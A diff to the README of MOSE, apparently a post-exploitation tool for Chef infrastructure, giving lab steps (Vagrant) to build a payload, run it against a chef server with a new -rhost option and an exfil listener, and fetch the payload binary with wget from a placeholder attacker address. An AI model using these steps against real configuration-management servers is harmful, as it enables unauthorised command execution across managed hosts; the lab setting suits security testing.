@@ -27,7 +27,9 @@ To run MOSE against the chef workstation:
 
 To run MOSE against the chef server:
 1. Build MOSE using `make build` in the MOSE repo
-2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t chef -l <your local ip address> -ep 9090`
+2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t chef -l <your local ip address> -ep 9090 -rhost chef-server:10.42.42.10`
+	2a. The exfil listener time can be set with the `-ep` parameter
+	2b. The `-rhost` parameter is a necessity if running against a chef-server. 
 3. Login to the chef server: `vagrant ssh chef_server` (the password is vagrant)
 4. Escalate to root with `sudo su`
 5. Download the binary from MOSE: `wget http://YOURIPADDRESSGOESHERE:8090/chef-linux`
